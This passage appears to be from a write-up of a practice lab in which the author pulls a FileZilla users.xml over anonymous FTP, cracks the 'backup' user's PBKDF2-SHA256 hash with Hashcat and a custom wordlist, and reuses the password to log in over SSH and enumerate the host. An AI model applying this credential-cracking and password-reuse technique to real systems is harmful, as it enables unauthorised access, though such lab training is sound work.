<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">9</span> <span class="n">Jan</span> <span class="mi">30</span>  <span class="mi">2024</span> <span class="n">ftp</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>              <span class="mi">32</span> <span class="n">Dec</span> <span class="mi">29</span>  <span class="mi">2023</span> <span class="n">local</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">226</span> <span class="n">Operation</span> <span class="n">successful</span>
<span class="nd">ftp</span><span class="nd">&gt;</span>
</pre></div>
<p>There‚Äôs a <code>users.xml</code> FileZilla configuration file, along with a couple of password files. I‚Äôll go ahead and download them for inspection.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">*.</span><span class="n">txt</span>
<span class="n">firewall</span><span class="p">:</span><span class="n">firewall123</span>
<span class="n">ftp</span><span class="p">:</span><span class="n">ftp</span>
<span class="n">administrator</span><span class="p">:[</span><span class="n">Moved</span> <span class="n">to</span> <span class="n">KeePass</span><span class="p">]</span>
</pre></div>
<p>These password files do not provide any useful information. Apparently, as shown above, the administrator password is stored in a KeePass database. Keep this in mind, as we'll come back to KeePass later.</p><br/>
<p>On the other hand, the <code>users.xml</code> file contains some rather interesting information.</p><br/>
<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="n">standalone</span><span class="o">=</span><span class="s2">"yes"</span><span class="n">?</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">filezilla</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">fz</span><span class="o">=</span><span class="s2">"https://filezilla-project.org"</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">"https://filezilla-project.org"</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="n">fz</span><span class="p">:</span><span class="n">product_flavour</span><span class="o">=</span><span class="s2">"standard"</span> <span class="n">fz</span><span class="p">:</span><span class="n">product_version</span><span class="o">=</span><span class="s2">"1.8.0"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">default_impersonator</span> <span class="n">index</span><span class="o">=</span><span class="s2">"0"</span> <span class="n">enabled</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;&lt;/</span><span class="n">name</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;&lt;/</span><span class="n">password</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">default_impersonator</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">user</span> <span class="n">name</span><span class="o">=</span><span class="s2">"&amp;lt;system user&gt;"</span> <span class="n">enabled</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
    <span class="o">&lt;/</span><span class="n">user</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">user</span> <span class="n">name</span><span class="o">=</span><span class="s2">"backup"</span> <span class="n">enabled</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">mount_point</span> <span class="n">tvfs_path</span><span class="o">=</span><span class="s2">"/"</span> <span class="n">access</span><span class="o">=</span><span class="s2">"1"</span> <span class="n">native_path</span><span class="o">=</span><span class="s2">""</span> <span class="n">new_native_path</span><span class="o">=</span><span class="s2">"E:\Private"</span> <span class="n">recursive</span><span class="o">=</span><span class="s2">"2"</span> <span class="n">flags</span><span class="o">=</span><span class="s2">"0"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">rate_limits</span> <span class="n">inbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">outbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">session_inbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">session_outbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">allowed_ips</span><span class="o">&gt;&lt;/</span><span class="n">allowed_ips</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">disallowed_ips</span><span class="o">&gt;&lt;/</span><span class="n">disallowed_ips</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">session_open_limits</span> <span class="n">files</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">directories</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">session_count_limit</span><span class="o">&gt;</span><span class="n">unlimited</span><span class="o">&lt;/</span><span class="n">session_count_limit</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">description</span><span class="o">&gt;&lt;/</span><span class="n">description</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">password</span> <span class="n">index</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nb">hash</span><span class="o">&gt;</span><span class="n">ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU</span><span class="o">&lt;/</span><span class="nb">hash</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">salt</span><span class="o">&gt;</span><span class="n">aec9Yt49edyEvXkZUinmS52UrwNoNNgoM</span><span class="o">+</span><span class="mi">6</span><span class="n">rK3fuFFw</span><span class="o">&lt;/</span><span class="n">salt</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">iterations</span><span class="o">&gt;</span><span class="mi">100000</span><span class="o">&lt;/</span><span class="n">iterations</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">methods</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;/</span><span class="n">methods</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">user</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">user</span> <span class="n">name</span><span class="o">=</span><span class="s2">"ftp"</span> <span class="n">enabled</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">mount_point</span> <span class="n">tvfs_path</span><span class="o">=</span><span class="s2">"/"</span> <span class="n">access</span><span class="o">=</span><span class="s2">"1"</span> <span class="n">native_path</span><span class="o">=</span><span class="s2">""</span> <span class="n">new_native_path</span><span class="o">=</span><span class="s2">"E:\Public"</span> <span class="n">recursive</span><span class="o">=</span><span class="s2">"2"</span> <span class="n">flags</span><span class="o">=</span><span class="s2">"0"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">rate_limits</span> <span class="n">inbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">outbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">session_inbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">session_outbound</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">allowed_ips</span><span class="o">&gt;&lt;/</span><span class="n">allowed_ips</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">disallowed_ips</span><span class="o">&gt;&lt;/</span><span class="n">disallowed_ips</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">session_open_limits</span> <span class="n">files</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="n">directories</span><span class="o">=</span><span class="s2">"unlimited"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">session_count_limit</span><span class="o">&gt;</span><span class="n">unlimited</span><span class="o">&lt;/</span><span class="n">session_count_limit</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">description</span><span class="o">&gt;&lt;/</span><span class="n">description</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">password</span> <span class="n">index</span><span class="o">=</span><span class="s2">"0"</span> <span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="n">methods</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">methods</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">user</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">filezilla</span><span class="o">&gt;</span>
</pre></div>
<p>This is a FileZilla configuration file that defines user directory access and credentials. As seen, the <code>ftp</code> user (the one that allows anonymous login) has access to the <code>E:\Public</code> directory, which we have already explored. More interestingly, there is another user named <code>backup</code>, who has access to the <code>E:\Private</code> directory. Unlike the <code>ftp</code> user, this account does not allow anonymous access, instead, its credentials are stored in the configuration file in hashed form.</p><br/>
<p>To crack this hash, we first need to determine which hashing algorithm FileZilla uses. Initially, I ran into some issues because many articles suggested that FileZilla uses <strong>PBKDF2 with HMAC-SHA512</strong> for the <code>users.xml</code> file. While that‚Äôs true in most cases, I wasn‚Äôt able to crack the hash. At first, I assumed the problem was that the backup user‚Äôs password wasn‚Äôt in my wordlist. However, after trying a few common passwords, I managed to log in using <code>backup123</code>. Even though this confirmed the correct password, I was still puzzled as to why it hadn‚Äôt cracked, since the password is included in my custom wordlist. After digging a bit deeper, I found another post explaining that the password can also be hashed using <strong>PBKDF2 with HMAC-SHA256</strong>.</p><br/>
<p>You can format the hash like this to crack it with Hashcat:</p>
<div class="highlight"><pre><span></span><span class="n">sha256</span><span class="p">:</span><span class="mi">100000</span><span class="p">:</span><span class="n">aec9Yt49edyEvXkZUinmS52UrwNoNNgoM</span><span class="o">+</span><span class="mi">6</span><span class="n">rK3fuFFw</span><span class="p">:</span><span class="n">ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU</span>
</pre></div>
<p>To crack this, I created a custom wordlist using common words related to the user and the organization (the chain) name:</p>
<div class="highlight"><pre><span></span>Password123
Password
backup
Backup123
backup123
backup2024
secret123
secret
Secret123
Kaiju123
kaiju123
kaiju2023
kaiju2024
kaiju
KAIJU
PASSWORD
</pre></div>
<p>Now, let‚Äôs crack it using Hashcat with hash mode <strong>10900</strong>, which corresponds to <strong>PBKDF2-HMAC-SHA256</strong>:</p>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">10900</span> <span class="o">-</span><span class="n">a0</span> <span class="nb">hash</span><span class="o">.</span><span class="n">txt</span> <span class="n">wordlist</span><span class="o">.</span><span class="n">txt</span>
<span class="n">hashcat</span> <span class="p">(</span><span class="n">v6</span><span class="mf">.2.6</span><span class="p">)</span> <span class="n">starting</span>

<span class="n">OpenCL</span> <span class="n">API</span> <span class="p">(</span><span class="n">OpenCL</span> <span class="mf">3.0</span> <span class="n">PoCL</span> <span class="mf">5.0</span><span class="o">+</span><span class="n">debian</span>  <span class="n">Linux</span><span class="p">,</span> <span class="kc">None</span><span class="o">+</span><span class="n">Asserts</span><span class="p">,</span> <span class="n">RELOC</span><span class="p">,</span> <span class="n">SPIR</span><span class="p">,</span> <span class="n">LLVM</span> <span class="mf">16.0.6</span><span class="p">,</span> <span class="n">SLEEF</span><span class="p">,</span> <span class="n">DISTRO</span><span class="p">,</span> <span class="n">POCL_DEBUG</span><span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#1 [The pocl project]</span>
<span class="o">==================================================================================================================================================</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>          

<span class="n">sha256</span><span class="p">:</span><span class="mi">100000</span><span class="p">:</span><span class="n">aec9Yt49edyEvXkZUinmS52UrwNoNNgoM</span><span class="o">+</span><span class="mi">6</span><span class="n">rK3fuFFw</span><span class="p">:</span><span class="n">ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU</span><span class="p">:</span><span class="n">backup123</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
</pre></div>
<p>Alright, let‚Äôs move on with the chain.</p><br/>
<p>Now, let's connect to the FileZilla server using the <code>backup</code> user:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">ls</span>
<span class="mi">229</span> <span class="n">Entering</span> <span class="n">Extended</span> <span class="n">Passive</span> <span class="n">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">65037</span><span class="o">|</span><span class="p">)</span>
<span class="mi">150</span> <span class="n">Starting</span> <span class="n">data</span> <span class="n">transfer</span><span class="o">.</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Backups</span>
<span class="mi">226</span> <span class="n">Operation</span> <span class="n">successful</span>
<span class="nd">ftp</span><span class="nd">&gt;</span>
</pre></div>
<p>Once logged in, we discovered another <em>Backups</em> directory. However, listing its contents showed that it was empty. So, what now? Well, this machine also has an SSH service running, let's check if the <code>backup</code> user exists and whether it uses the same password as in FileZilla.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">backup</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">backup</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="s1">'s password: </span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.2159</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span>
</pre></div>
<p>And it worked! We gained access to <strong>BERSRV200</strong> as the <code>backup</code> user.</p><br/>
<p>The <code>backup</code> account is just a local user and doesn‚Äôt have any interesting privileges on the machine.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span><span class="n">whoami</span> <span class="o">/</span><span class="nb">all</span>

<span class="n">USER</span> <span class="n">INFORMATION</span>
<span class="o">----------------</span>

<span class="n">User</span> <span class="n">Name</span>        <span class="n">SID</span>
<span class="o">================</span> <span class="o">===========================================</span>
<span class="n">bersrv200</span>\<span class="n">backup</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">2619869422</span><span class="o">-</span><span class="mi">1307147141</span><span class="o">-</span><span class="mi">4583047</span><span class="o">-</span><span class="mi">1002</span>


<span class="n">GROUP</span> <span class="n">INFORMATION</span>
<span class="o">-----------------</span>

<span class="n">Group</span> <span class="n">Name</span>                             <span class="n">Type</span>             <span class="n">SID</span>          <span class="n">Attributes</span>
<span class="o">======================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
<span class="n">Everyone</span>                               <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span>      <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">BUILTIN</span>\<span class="n">Users</span>                          <span class="n">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">545</span> <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">NETWORK</span>                   <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">2</span>      <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Authenticated</span> <span class="n">Users</span>       <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>     <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">This</span> <span class="n">Organization</span>         <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">15</span>     <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Local</span> <span class="n">account</span>             <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">113</span>    <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">NTLM</span> <span class="n">Authentication</span>       <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="mi">10</span>  <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">Mandatory</span> <span class="n">Label</span>\<span class="n">Medium</span> <span class="n">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">8192</span>


<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>  
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Enabled</span>


<span class="n">USER</span> <span class="n">CLAIMS</span> <span class="n">INFORMATION</span>
<span class="o">-----------------------</span>

<span class="n">User</span> <span class="n">claims</span> <span class="n">unknown</span><span class="o">.</span>

<span class="n">Kerberos</span> <span class="n">support</span> <span class="k">for</span> <span class="n">Dynamic</span> <span class="n">Access</span> <span class="n">Control</span> <span class="n">on</span> <span class="n">this</span> <span class="n">device</span> <span class="n">has</span> <span class="n">been</span> <span class="n">disabled</span><span class="o">.</span>

<span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span>
</pre></div>
<p>The <code>Users</code> directory gives us information about accounts that were logged in the system:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span><span class="nb">dir</span> <span class="o">..</span>
 <span class="n">Volume</span> <span class="n">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
 <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">AC3F</span><span class="o">-</span><span class="n">A083</span>

 <span class="n">Directory</span> <span class="n">of</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>

<span class="mi">09</span><span class="o">/</span><span class="mi">09</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">12</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
<span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">06</span><span class="p">:</span><span class="mi">23</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Administrator</span>
<span class="mi">01</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2024</span>  <span class="mi">07</span><span class="p">:</span><span class="mi">52</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Administrator</span><span class="o">.</span><span class="n">KAIJU</span>
<span class="mi">09</span><span class="o">/</span><span class="mi">09</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">12</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">backup</span>
<span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">26</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">clare</span><span class="o">.</span><span class="n">frost</span>
<span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">06</span><span class="p">:</span><span class="mi">23</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Public</span>
<span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">07</span><span class="p">:</span><span class="mi">38</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">sasrv200</span>
               <span class="mi">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="mi">0</span> <span class="nb">bytes</span>
               <span class="mi">7</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">7</span><span class="p">,</span><span class="mi">880</span><span class="p">,</span><span class="mi">282</span><span class="p">,</span><span class="mi">112</span> <span class="nb">bytes</span> <span class="n">free</span>

<span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span>
</pre></div>
<p><code>clare.frost</code> seems to be a domain user, but at this point we can‚Äôt do anything with that. </p><br/>
<p>So far, we don‚Äôt know which of the machines are domain controllers. One way to identify a DC is by running <code>ipconfig /all</code> and checking the DNS server. Workstations and other Windows servers joined to a domain typically have their DNS server pointing to the IP address of the DC.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">backup</span><span class="o">&gt;</span> <span class="n">ipconfig</span> <span class="o">/</span><span class="nb">all</span> <span class="o">|</span> <span class="n">findstr</span> <span class="s2">"DNS"</span>         
   <span class="n">DNS</span> <span class="n">Suffix</span> <span class="n">Search</span> <span class="n">List</span><span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
   <span class="n">Connection</span><span class="o">-</span><span class="n">specific</span> <span class="n">DNS</span> <span class="n">Suffix</span>  <span class="o">.</span> <span class="p">:</span> <span class="n">eu</span><span class="o">-</span><span class="n">central</span><span class="o">-</span><span class="mf">1.</span><span class="n">compute</span><span class="o">.</span><span class="n">internal</span>
   <span class="n">DNS</span> <span class="n">Servers</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="p">:</span> <span class="mf">10.10.221.53</span>
</pre></div>
<p>In this case, the DNS server is <code>10.10.221.53</code>, which corresponds to the <code>BERSRV100</code> machine. You‚Äôll likely need this information later, so make a note of it. We‚Äôll also be using a SOCKS proxy later to reach some internal services.</p><br/>
<p>After navigating through the File System, I didn't find anything interesting in the C drive that the backup user has access. However, there's another E: drive, as we saw in the <code>users.xml</code> file.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">E</span><span class="p">:</span>
<span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="o">&gt;</span><span class="nb">dir</span>
 <span class="n">Volume</span> <span class="n">in</span> <span class="n">drive</span> <span class="n">E</span> <span class="n">is</span> <span class="n">Data</span>
 <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">A494</span><span class="o">-</span><span class="mi">31</span><span class="n">FF</span>

 <span class="n">Directory</span> <span class="n">of</span> <span class="n">E</span><span class="p">:</span>\

<span class="mi">12</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">15</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Private</span>
<span class="mi">12</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">15</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Program</span> <span class="n">Files</span>
<span class="mi">12</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">15</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Public</span>
               <span class="mi">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="mi">0</span> <span class="nb">bytes</span>
               <span class="mi">3</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">1</span><span class="p">,</span><span class="mi">960</span><span class="p">,</span><span class="mi">206</span><span class="p">,</span><span class="mi">336</span> <span class="nb">bytes</span> <span class="n">free</span>

<span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="o">&gt;</span>
</pre></div>
<p>As observed, the directories we previously accessed through FTP are also here. However, there‚Äôs another interesting one: <code>Program Files</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">backup@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span><span class="o">&gt;</span><span class="n">tree</span> <span class="o">/</span><span class="n">F</span>
<span class="n">Folder</span> <span class="n">PATH</span> <span class="n">listing</span> <span class="k">for</span> <span class="n">volume</span> <span class="n">Data</span>
<span class="n">Volume</span> <span class="n">serial</span> <span class="n">number</span> <span class="n">is</span> <span class="n">A494</span><span class="o">-</span><span class="mi">31</span><span class="n">FF</span>
<span class="n">E</span><span class="p">:</span><span class="o">.</span>
<span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">FileZilla</span> <span class="n">Server</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">COPYING</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">config</span><span class="o">-</span><span class="n">converter</span><span class="o">.</span><span class="n">exe</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">filezilla</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">crypt</span><span class="o">.</span><span class="n">exe</span>
